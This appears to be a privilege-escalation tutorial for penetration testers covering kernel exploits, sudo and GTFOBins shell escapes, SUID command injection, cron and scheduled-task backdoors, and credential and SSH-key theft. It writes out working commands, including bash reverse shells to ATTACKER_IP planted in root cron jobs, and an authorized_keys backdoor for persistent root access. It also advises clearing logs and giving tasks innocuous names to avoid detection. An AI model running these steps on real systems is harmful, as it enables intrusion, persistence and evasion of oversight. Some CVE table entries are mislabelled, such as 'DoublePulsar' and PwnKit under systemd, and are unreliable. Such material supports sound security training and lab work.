### How Kernel Exploits Work

**Strategy:**

1. **Identify OS Version**
   ```bash
   $ uname -r
   3.10.0-1127.el7.x86_64
   # OR
   $ cat /etc/os-release
   Ubuntu 16.04 LTS
   ```
   > `uname -r` gives the kernel version string to search for CVEs; `/etc/os-release` shows the distro and release for exploit compatibility checking.

2. **Search for Known Exploits**
   ```bash
   # Method 1: Google the version
   "3.10.0-1127 kernel exploit"
   
   # Method 2: Use SearchSploit
   $ searchsploit 3.10.0 linux
   
   # Method 3: Check CVE databases
   https://cve.mitre.org
   https://nvd.nist.gov
   ```
   > `searchsploit 3.10.0 linux` searches the local Exploit-DB for matching kernel exploits. Add `privilege escalation` to narrow results; use `linux-exploit-suggester` on the target for automated kernel CVE matching.

3. **Find CVE Number**
   ```
   CVE-YEAR-NUMBER format
   Example: CVE-2016-5195 (DirtyCow)
   ```

4. **Download/Build Exploit**
   ```bash
   # Find exploit code
   # Compile if needed (usually C code)
   $ gcc exploit.c -o exploit
   ```
   > Compiles a C exploit to an executable named `exploit`. Some exploits need extra flags (e.g., `-pthread` for DirtyCow); read the exploit source comments for the correct compile command.

5. **Run on Target**
   ```bash
   $ ./exploit
   # Success: Root shell obtained
   ```

---

### Real Example: DirtyCow (CVE-2016-5195)

**Vulnerability:**
```
Affects: Linux kernels before 4.8.3
Issue: Race condition in memory handling
Impact: Privilege escalation to root
```

**Identification:**
```bash
$ uname -r
3.10.0-514.el7.x86_64
# Kernel version 3.10 → Vulnerable!
```

**Exploitation:**
```bash
$ searchsploit DirtyCow
[*] DirtyCow CVE-2016-5195 Linux Privilege Escalation

$ # Download and compile
$ gcc -pthread dirty.c -o dirty -lutil
$ ./dirty

# Result: Root shell or backdoor user created
```

---

### Linux Kernel Exploits: Common CVEs

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| **CVE-2016-5195** | DirtyCow | Linux < 4.8.3 | Privilege Escalation |
| **CVE-2021-4034** | PwnKit | Linux (systemd) | Privilege Escalation |
| **CVE-2021-22555** | Netfilter | Linux 4.x | Privilege Escalation |
| **CVE-2019-1010317** | ptrace | Linux < 5.3 | Privilege Escalation |
| **CVE-2017-1000112** | UFO | Linux < 4.13 | Privilege Escalation |

---

### Windows Kernel Exploits: Common CVEs

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| **CVE-2014-6324** | Kerberos DoublePulsar | Windows Server 2012 R2 | Privilege Escalation |
| **CVE-2016-3225** | Win32k | Windows 7/8/10 | Privilege Escalation |
| **CVE-2017-0005** | GDI | Windows 7/8/10 | Privilege Escalation |
| **CVE-2018-8611** | Win32k | Windows 10 | Privilege Escalation |

---

### ⚠️ Critical Warnings: Kernel Exploits

**Danger 1: System Instability**

```
Kernel exploits interact with core system components
Buggy exploit → System crash
Success might still cause instability
Production systems at risk
```

**Best Practice:**
```
✓ Test in lab environment first
✓ Understand what exploit does
✓ Have rollback plan
✓ Never on production without approval
```

---

**Danger 2: Data Loss**

```
Kernel exploit crashes system
Unsaved data lost
Running processes terminated
File system might be corrupted
```

**Mitigation:**
```
✓ Coordinate with client
✓ Schedule during maintenance window
✓ Have backups ready
✓ Document your actions
```

---

**Danger 3: Detection**

```
Kernel exploits create system events
Crash = obvious sign of compromise
Suspicious processes = detected
Stability issues = admin investigation
```

**Solution:**
```
✓ Use stealthier exploits first
✓ Use kernel exploit as last resort
✓ Clean up logs if possible
✓ Document reason for instability
```

---

### Kernel Exploit Methodology

**Step 1: Identify Version**
```bash
$ uname -a
Linux target 3.10.0-514.el7.x86_64
```
> `uname -a` gives the full kernel version string. Use the first three version numbers (e.g., `3.10.0`) when searching for exploits — the patch level affects applicability.

**Step 2: Search for Vulnerabilities**
```bash
$ searchsploit 3.10.0
# Or
$ google "3.10.0 linux kernel exploit"
```
> Start with searchsploit for offline speed, then fall back to Google. Also run `linux-exploit-suggester` directly on the target — it cross-references uname output against a CVE database automatically.

**Step 3: Assess Applicability**
```
- Is this the right kernel version?
- Does exploit apply to your CPU architecture (x86/x64)?
- Are dependencies available (gcc, etc.)?
```

**Step 4: Obtain Exploit**
```bash
# From SearchSploit
$ searchsploit -m linux/local/40844.c

# Or from GitHub/Exploit-DB
$ wget https://raw.githubusercontent.com/.../exploit.c
```
> `searchsploit -m` copies the exploit to your current directory. Read the source before compiling — it may have hardcoded paths or require specific compilation flags listed in the comments.

**Step 5: Compile (if needed)**
```bash
$ gcc -o exploit exploit.c -pthread
# Or
$ python3 exploit.py
# Or
$ ./exploit.sh (already compiled)
```
> `-pthread` is needed for exploits that use threads (e.g., DirtyCow). If gcc isn't on the target, compile on your attacker machine with the same architecture and transfer the binary.

**Step 6: Execute with Caution**
```bash
$ ./exploit
# Monitor for crashes/errors
# Check if root access achieved
```

**Step 7: Verify Success**
```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```

---

## Vector 2: Vulnerable Software

### The Concept

```
Installed outdated application
    ↓
Contains known security vulnerability
    ↓
Public exploit available
    ↓
Exploit vulnerability → Get root access
```

**Key Insight:**
```
Old software = Known vulnerabilities
Public exploits available
Often easier than kernel exploits
```

---

### How to Find Installed Software

**On Linux:**

```bash
# List all installed packages
$ dpkg -l
# Shows: package name, version, description

# Example:
ii  openssh-server    1:7.4p1-10
ii  apache2           2.4.41-1
ii  mysql-server      8.0.23-0
```
> Lists all installed Debian/Ubuntu packages with version numbers. Output is large — pipe through `less` or redirect to a file and grep for interesting software.

**Better formatting:**
```bash
$ dpkg -l | grep -i mysql
ii  mysql-server      8.0.23-0
```
> `-i` makes the grep case-insensitive. Replace `mysql` with any software name to check its installed version for CVE research.

**Find specific version:**
```bash
$ dpkg -l | grep apache
ii  apache2           2.4.41-1
```
> Filters the package list to show only Apache entries. The second column is the version — take that to searchsploit or exploit-db.com for known vulnerabilities.

---

**On Windows:**

```cmd
# Check Program Files
C:\> dir "C:\Program Files"
C:\> dir "C:\Program Files (x86)"

# Or use PowerShell
PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```
> `dir "C:\Program Files"` lists installed 64-bit apps; `(x86)` covers 32-bit. The PowerShell registry query returns structured objects including `DisplayName` and `DisplayVersion` — pipe to `Select DisplayName,DisplayVersion` for clean output.

**See all installed software with versions:**
```cmd
C:\> wmic product list brief
```
> Lists all MSI-installed software with name, version, and vendor. Not all software uses MSI (some use portable installs), so also check Program Files manually. Takes a few seconds to run.

**Step 3: Search for Vulnerabilities**

---

### Example: Vulnerable Apache Version

**Discovered:**
```bash
$ dpkg -l | grep apache
ii  apache2  2.4.10-1

$ apache2 -v
Server version: Apache/2.4.10 (Debian)
```

**Search for Exploits:**
```bash
$ searchsploit apache 2.4.10
# Results:
# - CVE-2021-41773 (Apache 2.4.50)
# - CVE-2021-42013 (Apache 2.4.50)
# ... many others

# Or Google:
# "apache 2.4.10 exploit"
# "Apache 2.4.10 CVE"
```
> Replace `apache 2.4.10` with the exact software and version you found. Results are filtered from the offline Exploit-DB — results show exploit type (local/remote/DoS) and path. Use `searchsploit -m <path>` to copy the exploit file to your current directory.

**Check for Path Traversal:**
```bash
# Apache 2.4.49+ has path traversal
# But 2.4.10 might have different vulns
# Search for specific CVEs affecting 2.4.10
```

---

### Example: Vulnerable MySQL Version

**Discovered:**
```bash
$ mysql --version
mysql  Ver 14.14 Distrib 5.7.20

$ # This is old! Current is 8.0+
```

**Search for Exploits:**
```bash
$ searchsploit mysql 5.7.20
# Results: Multiple privilege escalation vectors

$ searchsploit "mysql 5.7" privilege escalation
```
> The second form uses quotes to search for the exact phrase and adds `privilege escalation` to filter noise. Use both — one finds version-specific results, the other narrows to PrivEsc-relevant exploits only.

**Common MySQL PrivEsc Vectors:**

1. **UDF Exploitation**
   ```
   MySQL running as root
   Can load custom libraries (UDF)
   Create backdoor library
   Execute commands as root
   ```

2. **Plugin Exploitation**
   ```
   Vulnerable MySQL plugins
   Execute code through plugins
   Gain root execution
   ```

---

### How to Identify Vulnerable Software Versions

**Method 1: Online Vulnerability Database**

```
1. Know the software: Apache, MySQL, PHP, etc.
2. Know the version: 2.4.10, 5.7.20, 7.4.3, etc.
3. Search CVE database:
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=
   
4. Check if vulnerabilities are available
5. Check if public exploits exist
```

**Method 2: SearchSploit**

```bash
# Exact software + version
$ searchsploit apache 2.4.10

# Or multiple versions
$ searchsploit "apache 2.4"

# Look for:
# - Local privilege escalation
# - Remote code execution
# - Configuration issues
```

**Method 3: GitHub Exploit Repositories**

```
Search GitHub for:
"apache 2.4.10 exploit"
"apache 2.4.10 rce"

Many security researchers publish exploits on GitHub
```

---

### Software Vulnerability Exploitation Workflow

**Step 1: List Installed Software**

Linux:
```bash
$ dpkg -l
# Note all software and versions
```
> Lists all installed packages with version numbers. Output is long — pipe to `less` or redirect to a file. Focus on server software (apache2, mysql-server, php, etc.) and note their exact version strings for CVE searching.

Windows:
```cmd
C:\> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
```
> Queries the registry for all installed 64-bit programs. For 32-bit apps add `Wow6432Node\` to the path. Pipe to `Select DisplayName, DisplayVersion | Sort DisplayName` for a clean, sorted list.

**Step 2: Note Interesting Software**

```
Look for:
✓ Old versions (3+ years old)
✓ Server software (Apache, MySQL, etc.)
✓ Popular targets (PHP, Java, etc.)
✓ Rarely updated (embedded systems, appliances)
```

**Step 3: Search for Vulnerabilities**

```bash
$ for app in apache2 mysql php; do
    searchsploit "$app" | head -5
  done
```
> Loops through multiple app names and runs searchsploit for each — good for a quick triage pass. Replace the app names with whatever you found via `dpkg -l`. `head -5` limits output so it doesn't flood the terminal.

**Step 4: Assess Exploitability**

```
Questions to ask:
- Does exploit apply to my version?
- Is the vulnerability local or remote?
- Do I have required permissions?
- Are dependencies available?
- How stable is the exploit?
```

**Step 5: Obtain and Verify Exploit**

```bash
# Download
$ searchsploit -m path/to/exploit.c

# Read the code
$ cat exploit.c
# Look for version check, dependencies, etc.

# Compile if needed
$ gcc -o exploit exploit.c
```
> `searchsploit -m` mirrors the exploit file to the current directory. Always `cat` it before running — check for hardcoded paths, required args, and the exact compilation command usually listed in the header comments.

**Step 6: Execute and Verify**

```bash
$ ./exploit
# Monitor output
# Check for success indicators

$ id
# Should show elevated privileges
```
> Run `./exploit` and watch for any output indicating success or failure. Immediately follow with `id` — if `uid=0(root)` appears, you have root. If the exploit crashes or errors, read the output and check whether you compiled with the right flags.

---

## Common Vulnerable Software in Linux

| Software | Vulnerable Versions | Common Exploit | Impact |
|----------|-------------------|---------------|---------:|
| **Apache** | 2.4.49-2.4.50 | Path Traversal | RCE/PrivEsc |
| **MySQL/MariaDB** | 5.x, < 8.0.12 | UDF Loading | PrivEsc |
| **PHP** | < 7.0.0 | Various | RCE/PrivEsc |
| **sudo** | < 1.9.5 | Heap Overflow | PrivEsc |
| **OpenSSH** | < 7.4 | Username Enumeration | Info Disclosure |
| **Vim** | < 7.4.1157 | Modeline | RCE |

---

## Common Vulnerable Software in Windows

| Software | Vulnerable Versions | Common Exploit | Impact |
|----------|-------------------|---------------|---------:|
| **IIS** | < 10.0 | Various | RCE/PrivEsc |
| **SQL Server** | 2012, 2014 | UNC Path Injection | RCE |
| **PowerShell** | < 5.0 | Execution Policy Bypass | RCE |
| **WinRM** | Unpatched | Various | RCE |
| **SMBv3** | Unpatched | Various | RCE |

---

## Priority: What to Look for First

### High Priority (High Likelihood of Exploitation)

```
1. Kernel exploits (if old kernel)
2. Apache/web server vulnerabilities
3. Database software (MySQL, MSSQL)
4. Sudo/privilege management issues
5. Outdated scripting languages
```

### Medium Priority

```
6. Services running as root
7. Installed development tools
8. Custom applications
9. Monitoring/logging software
10. Backup utilities
```

### Low Priority (Harder to Exploit)

```
11. Client applications
12. System utilities
13. Recently patched software
14. Niche software
```

---

## Key Takeaways - Part 2: Common Vectors

1. **Kernel exploits:**
   - Identify OS version
   - Search for known CVEs
   - Test in lab first
   - Use as last resort (unstable)

2. **Vulnerable software:**
   - Identify all installed packages
   - Check version numbers
   - Search for public exploits
   - Often easier than kernel exploits

3. **Finding software:**
   - Linux: `dpkg -l`
   - Windows: `C:\Program Files`, PowerShell, WMIC
   - Note versions carefully

4. **Exploitation workflow:**
   - Identify software
   - Find vulnerability
   - Obtain exploit
   - Test in lab
   - Execute carefully
   - Verify success

5. **Priority approach:**
   - Kernel first (if applicable)
   - Then software exploits
   - Then other vectors
   - Use least disruptive first

6. **Safety considerations:**
   - Lab test first
   - Get explicit approval
   - Have rollback plan
   - Monitor for crashes
   - Document everything

---

# PART 3: USER PRIVILEGES & CREDENTIAL EXPLOITATION

## Vector 1: Sudo Privileges

### What is Sudo?

**Definition:**
```
sudo = "superuser do"
Allows users to execute commands as different user
Typically used to let unprivileged users run root commands
Controlled via /etc/sudoers file
```

**Why It Matters:**
```
✓ Common misconfiguration
✓ Can escalate to root directly
✓ May not require password
✓ One of easiest PrivEsc vectors
```

---

### Checking Sudo Privileges

**Command:**
```bash
sudo -l
```
> Lists all sudo privileges for the current user. No password needed to run the check itself (even on password-protected sudo). The single most important command to run immediately after gaining a shell.

**Example Output (Password Required):**
```bash
$ sudo -l
[sudo] password for user:
# (You need password - not useful for RCE access)
```

**Example Output (No Password Required):**
```bash
$ sudo -l
Matching Defaults entries for user on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands without password:
    (root) NOPASSWD: /bin/echo
    (root) NOPASSWD: /usr/bin/find
    (www-data) NOPASSWD: /bin/cat

# This is VULNERABLE!
```

---

### Understanding Sudo Output

**Format Breakdown:**

```
(user : user) NOPASSWD: /bin/echo
 ↑     ↑      ↑        ↑
 |     |      |        |
 |     |      |        └─ Command that can be run
 |     |      └─ NOPASSWD = don't need password
 |     └─ Pseudo-user (who you run as)
 └─ Real user (who you are)
```

**Examples:**

```bash
# Run /bin/echo as root, no password
(root) NOPASSWD: /bin/echo
→ Can execute: sudo /bin/echo

# Run /usr/bin/find as www-data, no password
(www-data) NOPASSWD: /usr/bin/find
→ Can execute: sudo -u www-data /usr/bin/find

# Run ALL commands as root with password
(root) ALL
→ Can execute anything, but needs password

# Run specific command as specific user
(www-data) NOPASSWD: /usr/bin/id
→ Can execute: sudo -u www-data /usr/bin/id
```

---

### Exploiting Sudo Privileges

**If You Have NOPASSWD Sudo:**

```
1. Check what commands you can run
   $ sudo -l

2. Look for exploitable commands
   - Can any command give you shell?
   - Can any command read/write files?
   - Can any command execute other commands?

3. Use that command to escalate
   $ sudo /bin/command arg1 arg2
```

---

### GTFOBins: Finding Sudo Exploits

**What is GTFOBins?**
```
GitHub repository: https://gtfobins.github.io
List of Unix/Linux commands that can be exploited
Shows HOW to exploit each command
Includes shell escaping techniques
```

**How to Use:**

```
1. Find command you have sudo for
   Example: /bin/find

2. Visit GTFOBins and search "find"

3. Look for "Sudo" section
   Shows exact exploit command

4. Copy the exploit command
```

---

### Common Sudo Exploitation Examples

**Example 1: Sudo with find**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/find

# GTFOBins says:
$ sudo find / -exec /bin/sh \; -quit
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```
> Classic GTFOBins sudo escape. `find` runs as root, `-exec /bin/sh` spawns a shell inheriting root's privileges, `-quit` exits after the first match. Replace `/bin/sh` with `/bin/bash` for a better shell.

**Explanation:**
```
sudo find /        # Run find with sudo (as root)
  -exec /bin/sh   # Execute shell when find matches
  \; -quit        # After first match, quit
# Result: Root shell!
```

---

**Example 2: Sudo with less**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/less

# GTFOBins says:
$ sudo less /etc/passwd
# Then inside less, type: !/bin/sh
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```
> `sudo less` opens the pager as root. Inside less, typing `!<command>` executes a shell command — so `!/bin/sh` drops you into a root shell. Works identically with `man`, `more`, `vi`, and any other pager-style tool.

**Explanation:**
```
less /etc/passwd   # Open file in less pager
!/bin/sh           # Inside less, ! escapes to shell
# Result: Root shell!
```

---

**Example 3: Sudo with vi/vim**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/vim

# GTFOBins says:
$ sudo vim
# Inside vim, type: :!/bin/sh
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```
> `sudo vim` opens vim as root. In vim's command mode, `:!/bin/sh` runs a shell command — the `!` in ex-command mode spawns the command as a subprocess, which inherits vim's root privileges. You get a root shell; type `exit` to return to vim.

---

### Using GTFOBins Effectively

**Step-by-Step:**

```
1. Get your sudo privileges
   $ sudo -l
   Note: /usr/bin/find

2. Go to https://gtfobins.github.io

3. Search for "find"

4. Find "Sudo" section (if exists)

5. Copy the exact command

6. Execute it

7. You should get root shell
```

**What if Command Not on GTFOBins?**

```
Try these approaches:
1. Search manually for the command + "PrivEsc"
2. Read the command's man page for escape options
3. Combine with other vectors (file write, etc.)
4. Ask: "Can this read files? Write files? Execute?"
```

---

### LOLBAS (Windows Equivalent)

**What is LOLBAS?**
```
Windows version of GTFOBins
Repository: https://lolbas-project.github.io
Lists Windows built-in tools that can be abused
Includes privilege escalation techniques
```

**Common Windows Tools:**
```
- rundll32.exe (execute DLLs)
- powershell.exe (script execution)
- reg.exe (registry modification)
- wmic.exe (Windows Management Instrumentation)
- msiexec.exe (Windows installer)
```

**Example: PowerShell PrivEsc**
```powershell
# Check what you can run
whoami /priv

# Or check UAC bypass techniques
# Use LOLBAS to find exact exploit
```

---

## Vector 2: SUID/SGID Binaries

### What are SUID/SGID Files?

**SUID (Set User ID):**
```
File permission that runs binary as OWNER, not executor
Example: -rwsr-xr-x (note the 's')
Runs as the file owner regardless of who runs it
Typically owner is root
```

**SGID (Set Group ID):**
```
Similar to SUID but for groups
Runs as the group owner instead of user
Less common than SUID
```

---

### Finding SUID/SGID Files

**Command:**
```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Find SGID files
find / -perm -2000 2>/dev/null

# Find both
find / -perm /4000 -o -perm /2000 2>/dev/null
```
> `-perm -4000` matches files with the SUID bit set (runs as file owner); `-perm /4000 -o -perm /2000` finds both SUID and SGID. Pipe to `ls -la` for ownership details; cross-reference with GTFOBins for exploitable binaries.

**Example Output:**
```
-rwsr-xr-x 1 root root /usr/bin/passwd
-rwsr-xr-x 1 root root /usr/bin/sudo
-rwsr-xr-x 1 root root /usr/bin/ping
-rwsr-xr-x 1 root root /bin/su
```

---

### Exploiting SUID Binaries

**Concept:**
```
If SUID binary is VULNERABLE
You can exploit it to get root shell
Because it runs as root
```

**Common Vulnerable SUID Binaries:**

```
✓ Custom applications (not standard Linux)
✓ Old versions with known CVEs
✓ Misconfigured binaries
✗ Standard binaries (passwd, sudo, ping - patched)
```

---

### SUID Exploitation Workflow

**Step 1: Find SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
```
> `-perm -4000` matches files with the SUID bit set. Pipe to `ls -la` for ownership details or just review the paths — anything under `/usr/local/bin/`, `/opt/`, or home directories is likely custom and worth investigating.

**Step 2: Identify Non-Standard Binaries**
```
Standard binaries:
- /usr/bin/passwd
- /usr/bin/sudo
- /bin/su
- /usr/bin/ping

Look for CUSTOM binaries:
- /usr/local/bin/custom_app
- /home/user/app
- Custom programs
```

**Step 3: Test for Vulnerability**
```bash
# Check what it does
strings /usr/local/bin/custom_app

# Try to run it with special arguments
/usr/local/bin/custom_app /etc/shadow

# Try command injection
/usr/local/bin/custom_app "; /bin/sh"
```
> `strings` extracts readable ASCII from a binary — look for system calls, file paths, and hardcoded commands that hint at what the app does. Replace `custom_app` with the SUID binary you found.

**Step 4: Exploit**
```bash
# If vulnerable to command injection:
/usr/local/bin/custom_app "; /bin/sh"
# Runs as root → root shell!
```
> If the binary passes user input to a shell command without sanitizing it, appending `; /bin/sh` terminates the original command and spawns a root shell. The exact injection syntax varies — also try `$(whoami)`, backticks, and `| /bin/sh`.

---

## Vector 3: Scheduled Tasks & Cron Jobs

### Linux: Cron Jobs

**What are Cron Jobs?**
```
Scheduled tasks that run at specific times
Run commands periodically (hourly, daily, weekly, etc.)
Often run as root for system maintenance
```

**Common Cron Locations:**
```
/etc/crontab              - System-wide cron jobs
/etc/cron.d/              - Additional system cron jobs
/var/spool/cron/crontabs/ - User cron jobs
~/.crontab               - User's personal cron
```

---

### Exploiting Cron Jobs: Two Methods

**Method 1: Write Malicious Cron Job**

```
If you can write to cron directories:
1. Create bash script with reverse shell
2. Add cron job that runs your script
3. Wait for cron to execute
4. Reverse shell connects back
```

**Process:**

```bash
# Step 1: Check if you can write to cron directory
ls -la /etc/cron.d/
# If writable, continue

# Step 2: Create reverse shell script
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /tmp/shell.sh

# Step 3: Add cron job (if writable)
echo "* * * * * root /tmp/shell.sh" >> /etc/cron.d/my_cron

# Step 4: Wait for cron to run (usually within 1 minute)
# Step 5: Receive reverse shell as root
```
> `* * * * *` runs every minute. Replace ATTACKER_IP/PORT with your tun0 IP and nc listener port. Make shell.sh executable (`chmod +x`) and ensure your nc listener is running before cron fires.

---

**Method 2: Modify Existing Cron Job**

```
If a root cron job exists that runs a script:
1. Check if you can modify the script
2. Add malicious code to existing script
3. When cron runs, your code executes as root
```

**Process:**

```bash
# Step 1: Find existing cron jobs
cat /etc/crontab

# Example output:
# 0 * * * * root /usr/local/bin/backup.sh

# Step 2: Check if you can write to the script
ls -la /usr/local/bin/backup.sh
# If writable, continue

# Step 3: Add reverse shell to script
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /usr/local/bin/backup.sh

# Step 4: Wait for scheduled time
# Step 5: Receive reverse shell as root
```
> `>>` appends your payload without replacing the script's original content (less suspicious). Note the cron schedule — `0 * * * *` runs at the top of every hour, so you may wait up to 60 minutes.

---

### Windows: Scheduled Tasks

**What are Scheduled Tasks?**
```
Windows equivalent of cron jobs
Run programs at specific times
Often run as SYSTEM (highest privilege)
Managed through Task Scheduler
```

**Checking Scheduled Tasks:**
```powershell
# View all scheduled tasks
Get-ScheduledTask

# View task details
Get-ScheduledTask -TaskName "BackupTask"

# View task history
Get-ScheduledTask -TaskName "BackupTask" | Get-ScheduledTaskInfo
```
> `Get-ScheduledTask` lists all tasks — look for ones running as `SYSTEM` or `Administrator`. `-TaskName` filters to a specific task; pipe to `Get-ScheduledTaskInfo` to see last run time and status.

---

### Exploiting Windows Scheduled Tasks

**If You Can Create New Task:**

```powershell
# Create new scheduled task
$Action = New-ScheduledTaskAction -Execute "C:\reverse_shell.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Updates"

# Task runs when someone logs in → Reverse shell
```
> Creates a task named "Updates" (blend in with legitimate tasks) that fires at logon. Replace `C:\reverse_shell.exe` with your payload path. Make sure your nc listener is running before the next logon event.

**If You Can Modify Existing Task:**

```powershell
# Modify existing task to run your payload
Set-ScheduledTask -TaskName "Backup" `
  -Action (New-ScheduledTaskAction -Execute "C:\evil.exe")

# Next time task runs → Your code executes
```
> Replaces the action of an existing legitimate task with your payload — requires write permissions on the task. Replace `"Backup"` with the task name from `Get-ScheduledTask` and `C:\evil.exe` with your payload path.

---

## Vector 4: Exposed Credentials

### Finding Credentials in Files

**Where Credentials Hide:**

```
Configuration Files:
- /etc/mysql/mysql.conf.d/mysqld.cnf
- /var/www/html/config.php
- /app/settings.ini
- ~/.ssh/config

Log Files:
- /var/log/apache2/access.log
- /var/log/auth.log
- /tmp/*.log

History Files:
- ~/.bash_history (Linux)
- $PROFILE (PowerShell history - Windows)
- ~/.zsh_history
```

---

### Real Example: Found Database Credentials

**Scenario:**
```
Running LinPEAS on target
Finds configuration file with hardcoded password
```

**Example Output:**
```
[+] Searching passwords in config PHP files
/var/www/html/config.php: $conn = new MySQL('localhost', 'db_user', 'password123');
```

**Exploitation:**

```bash
# Step 1: Note the credentials
# Username: db_user
# Password: password123

# Step 2: Try password reuse (user might use same password)
$ su - root
Password: password123
$ whoami
root
# SUCCESS!
```

---

### Password Reuse Exploitation

**Concept:**
```
Users often reuse passwords across systems
Database password = User password = Root password
```

**Process:**

```bash
# Step 1: Find password in config file
$ grep password /var/www/html/config.php
password123

# Step 2: Try to switch to root user
$ su - root
Password: password123

# Step 3: Check if you're root
$ whoami
root

# Step 4: Success!
$ id
uid=0(root) gid=0(root)
```
> `grep password` searches the config file for lines containing "password" — try also `grep -i pass`, `grep -i secret`, `grep -i key` for variations. `su - root` prompts for root's password; the `-` loads root's full environment. Try every found password against root and any other usernames you've discovered.

---

### Checking History Files

**Linux Bash History:**
```bash
cat ~/.bash_history
cat /root/.bash_history  # If readable

# Look for:
# - mysql -u root -p password
# - ssh root@...
# - Commands with credentials
```
> History files often contain plaintext passwords typed in previous commands. `/root/.bash_history` is frequently world-readable on misconfigured systems — always check.

**PowerShell History (Windows):**
```powershell
type $PROFILE\ConsoleHost_history.txt
# Or
Get-History

# Look for passwords, API keys, credentials
```
> The full path is typically `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. `Get-History` only shows the current session; the file persists across sessions and often contains credentials passed as arguments.

---

## Vector 5: SSH Key Exploitation

### Reading Private SSH Keys

**What are SSH Keys?**
```
Private keys: Like passwords for SSH (stored in ~/.ssh/id_rsa)
Public keys: Safe to share (stored in ~/.ssh/id_rsa.pub)
If you read someone's private key → You can log in as them
```

---

### Stealing Existing SSH Keys

**Finding SSH Keys:**

```bash
# User SSH keys
cat /home/user/.ssh/id_rsa

# Root SSH keys
cat /root/.ssh/id_rsa

# Check if readable
ls -la /root/.ssh/
```
> Replace `user` with actual usernames found in `/etc/passwd`. Try `cat /root/.ssh/id_rsa` — on misconfigured boxes it's world-readable. `ls -la /root/.ssh/` shows permissions without needing to read the key content; if you see a file listing, the files inside may be readable even if the dir perms look restricted.

---

### Using Stolen SSH Keys

**On Your Attacker Machine:**

```bash
# Step 1: Copy the private key
# (You got it from reading /root/.ssh/id_rsa)
vim id_rsa
# Paste the key contents

# Step 2: Fix permissions (SSH requires 600)
chmod 600 id_rsa

# Step 3: SSH using the key
ssh -i id_rsa root@TARGET_IP

# Step 4: You're logged in as root!
root@target:~# id
uid=0(root) gid=0(root)
```
> Copy the entire key output from `-----BEGIN RSA PRIVATE KEY-----` to `-----END RSA PRIVATE KEY-----` inclusive. `chmod 600` is mandatory — SSH refuses keys with permissions that allow other users to read them. Replace `root` with the target username and `TARGET_IP` with the box IP.

---

### Creating SSH Key Persistence

**Goal:**
```
Gain SSH access that persists after you disconnect
Create permanent backdoor
Use your own key so no password needed
```

---

### Method 1: If You Have File Write Access

**Scenario:**
```
You have shell as www-data
You have write access to /root/.ssh/
You want persistent SSH access
```

**Process:**

```bash
# Step 1: On ATTACKER MACHINE - Generate your key pair
ssh-keygen -f key
# Creates: key (private) and key.pub (public)

# Step 2: Copy the PUBLIC key to clipboard
cat key.pub
# AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...

# Step 3: On TARGET MACHINE - Add your public key to authorized_keys
echo "AAAAB3NzaC1yc2EAAAADAQABAAABgQDk..." >> /root/.ssh/authorized_keys

# Step 4: Back on ATTACKER MACHINE - SSH with your private key
ssh -i key root@TARGET_IP

# Step 5: You're logged in as root!
root@target:~#
```

---

### Step-by-Step SSH Key Installation

**On Attacker Machine (Generate Key):**

```bash
# Step 1: Generate key pair
$ ssh-keygen -f key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): [press Enter]
Your identification has been saved in key
Your public key has been saved in key.pub

# Step 2: Check the files
$ ls -la key*
-rw------- 1 user user 1679 Jan 25 10:30 key
-rw-r--r-- 1 user user  401 Jan 25 10:30 key.pub

# Step 3: Display public key (for copying)
$ cat key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
```
> `-f key` saves the key pair to `key` (private) and `key.pub` (public) in the current directory. Press Enter for an empty passphrase so you can use the key non-interactively.

---

**On Target Machine (Install Public Key):**

```bash
# Step 1: As the compromised user (www-data with write to /root/.ssh/)
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker" >> /root/.ssh/authorized_keys

# Step 2: Verify it was added
$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker

# Step 3: Fix permissions (if needed)
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh/
```
> Appends your public key to root's authorized_keys — use `>>` not `>` to avoid overwriting existing keys. The permissions on authorized_keys and .ssh must be restrictive or SSH will ignore the file.

---

**Back on Attacker Machine (Login):**

```bash
# Step 1: SSH using your private key
$ ssh -i key root@TARGET_IP

# Step 2: No password needed! (SSH key authentication)
root@target:~# 

# Step 3: You're logged in as root!
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)

# Step 4: Persistent access - you can reconnect anytime
# Even if other shells die, SSH key still works
```
> `-i key` points SSH to your generated private key. Once the public key is in authorized_keys, this login works every time — even if the original shell you used to install the key dies. Replace `root` and `TARGET_IP` with the target user and box IP.

---

## SSH Key Security Note

**Why chmod 600?**

```
SSH keys must have restrictive permissions
If readable by other users → SSH refuses to use key

Correct permissions:
- Private key: 600 (-rw-------)
- .ssh directory: 700 (drwx------)
- authorized_keys: 600 (-rw-------)
```

---

## Key Takeaways - Part 3: User Privileges & Credentials

1. **Sudo Privileges:**
   - Check with `sudo -l`
   - Look for NOPASSWD entries
   - Use GTFOBins to find exploits
   - Often easiest PrivEsc vector

